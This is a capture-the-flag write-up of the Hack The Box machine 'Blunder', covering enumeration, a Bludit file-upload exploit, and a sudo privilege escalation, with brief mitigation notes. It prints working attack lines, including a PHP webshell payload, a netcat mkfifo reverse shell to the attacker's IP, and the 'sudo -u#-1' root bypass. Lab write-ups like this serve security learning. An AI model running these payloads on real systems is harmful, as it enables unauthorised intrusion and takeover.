# Blunder

I actually did this box when it was active, but I did not do a writeup of it.

So I'm gonna redo it:

```
root@kali:/home/kali/htb/blunder# nmap -p- -sV -sC 10.129.108.197
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-20 21:09 EDT
Nmap scan report for 10.129.108.197
Host is up (0.029s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.60 seconds
```

I head over to the web-server and see that all the links are linking to blunder.htb, so I add that to my hosts.

I find an admin login page over at /admin.

It's fair to assume that the username is admin. But I don't have any passwords.

I run cewl on the website to see if I can find any cewl(sorry) hints:

```
root@kali:/home/kali/htb/blunder# cewl -d 5 -m 5 -w cewl.txt http://blunder.htb
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
root@kali:/home/kali/htb/blunder# wc -l cewl.txt
243 cewl.txt
root@kali:/home/kali/htb/blunder# 
```

And we have 243 words. I can't get hydra to work, as there is a CSRF token refreshing every attempt.

I look through the list manually, and eventually see `RolandDeschain` which seems like a typo, missing a space. I try logging in with admin:RolandDeschain and also using that as the username.

I eventually searchsploit bludit:

```
root@kali:/home/kali/htb/blunder# searchsploit bludit
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass                        | php/webapps/48746.rb
Bludit - Directory Traversal Image File Upload (Metasploit)                        | php/remote/47699.rb
Bludit 3.9.12 - Directory Traversal                                                | php/webapps/48568.py
Bludit 3.9.2 - Auth Bruteforce Bypass                                              | php/webapps/48942.py
Bludit 3.9.2 - Directory Traversal                                                 | multiple/webapps/48701.txt
bludit Pages Editor 3.0.0 - Arbitrary File Upload                                  | php/webapps/46060.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:/home/kali/htb/blunder# 
```

And I find the Authentication Bruteforce bypass. Also note the directory traversal as well.

I try running this with the cewl wordlist on both username and admin. But I get nothing. I decide to enumerate the web-server further with wfuzz, and I find a todo.txt file:

```
root@kali:/home/kali/htb/blunder# wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://blunder.htb/FUZZ.txt
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://blunder.htb/FUZZ.txt
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                     
=====================================================================                        
000001765:   200        1 L      4 W        22 Ch       "robots"                                    
000002495:   200        4 L      23 W       118 Ch      "todo" 
```

Which states:

```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

So fergus is a possible username here. I try fergus:RolandDeschain, and it works.


I download the directory traversal exploit and modify it with the creds and url I have.

I then create the payload, according to the exploit and run it:

```
root@kali:/home/kali/htb/blunder# msfvenom -p php/reverse_php LHOST=10.10.14.51 LPORT=1337 -f raw -b '"' > evil.png
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 2 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 4084 (iteration=0)
php/base64 chosen with final size 4084
Payload size: 4084 bytes

root@kali:/home/kali/htb/blunder# echo -e "<?php $(cat evil.png)" > evil.png 
root@kali:/home/kali/htb/blunder# echo "RewriteEngine off" > .htaccess
root@kali:/home/kali/htb/blunder# echo "AddType application/x-httpd-php .png" >> .htaccess
root@kali:/home/kali/htb/blunder# python3 exploit.py
cookie: p3od5smt3saei86uol9rdogmn0
csrf_token: c07e624086f7fae160dc433211bedfb984829a3e
Uploading payload: evil.png
Uploading payload: .htaccess
root@kali:/home/kali/htb/blunder#
```

Then I visit http://blunder.htb/bl-content/tmp/temp/evil.png and get my reverse shell:

```
root@kali:/home/kali/htb/blunder# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.108.197 50090
whoami
www-data
```

Annoyingly, I cannot elevate this to a tty shell. So I'm stuck with it. I tried all of the tty tricks, and I even tried to nc out.

Just outside of the bludit directory, there's another. For a newer version.

Inside I find a users.php file with creds.

```
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

https://md5decrypt.net/en/Sha1/ found the hash:
faca404fd5c0a31cf1897b823c695c85cffeb98d : Password120 

I want a better shell however. So I go to pentestmonkey and fcheck out their netcat reverse shell one liner 
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.51 1337 >/tmp/f`

So evil.png will look like this:

```
root@kali:/home/kali/htb/blunder# cat evil.png 
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.51 1337 >/tmp/f"); ?>
root@kali:/home/kali/htb/blunder# 
```

Run the script again, and visit the page:

```
root@kali:/home/kali/htb/blunder# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.108.197 50684
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ ^Z
[1]+  Stopped                 nc -nlvp 1337
root@kali:/home/kali/htb/blunder# stty raw -echo
nc -nlvp 1337me/kali/htb/blunder# 
             reset
reset: unknown terminal type unknown
Terminal type? xterm
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ export TERM=xterm
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ export SHELL=bash
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ 
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ su hugo
Password: 
hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ sudo -l
Password: 
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ 
```

so we can run /bin/bash as any user except root as hugo.

I simply google `(ALL, !root) /bin/bash exploit` and https://www.exploit-db.com/exploits/47502 is the top result

It's for sudo <1.8.27

```
hugo@blunder:~$ sudo -V
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
hugo@blunder:~$ 
```

So It should work.

```
hugo@blunder:~$ sudo -u#-1 /bin/bash
root@blunder:/home/hugo# whoami
root
root@blunder:/home/hugo# id
uid=0(root) gid=1001(hugo) groups=1001(hugo) 
```

So sudo does not check if the user exists. And just executes the user id with the sudo priv no matter what.

And we are sending the uid value. And then -1 which will return 0. Which makes us root.

Video by John Hammond here: https://www.youtube.com/watch?v=btUf1O7lQmY


## Comparing myself to the official writeup:

They use gobuster to find admin and todo.txt

This gives user fergus, they use cewl to get a wordlist. and find the exploit to bruteforce the login.

They find the upload exploit and upload a new image with burpsuite. They then use a python payload to get the reverse shell.

they find hugo's sha1 password and move laterally to that user.

they use linpeas to enumerate the machine and find the sudo -l output.

then they simply use the exploit to get root.


## How to stop this exploit:

The todo.txt gives away the username, but having the password plaintext on the site is very bad. Not to mention it's a fairly weak password anyhow.

It's also very bad to have a users password in the config files of a unemployed bludit version.

And then finally sudo should be updated. or the users should be specified in the /etc/sudoers.